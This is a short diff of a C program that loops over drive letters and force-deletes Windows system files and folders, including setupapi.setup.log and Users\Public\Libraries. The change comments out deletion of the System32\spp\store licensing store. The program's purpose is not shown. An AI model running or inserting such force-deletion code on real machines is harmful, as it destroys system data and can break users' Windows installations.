@@ -272,8 +272,8 @@ int main() {
 			wsprintf(path, L"%c:\\Windows\\INF\\setupapi.setup.log", drive);
 			ForceDeleteFile(path);
 
-			wsprintf(path, L"%c:\\Windows\\System32\\spp\\store", drive);
-			ForceDeleteFile(path);
+			// wsprintf(path, L"%c:\\Windows\\System32\\spp\\store", drive);
+			// ForceDeleteFile(path);
 
 			wsprintf(path, L"%c:\\Users\\Public\\Libraries", drive);
 			ForceDeleteFile(path);
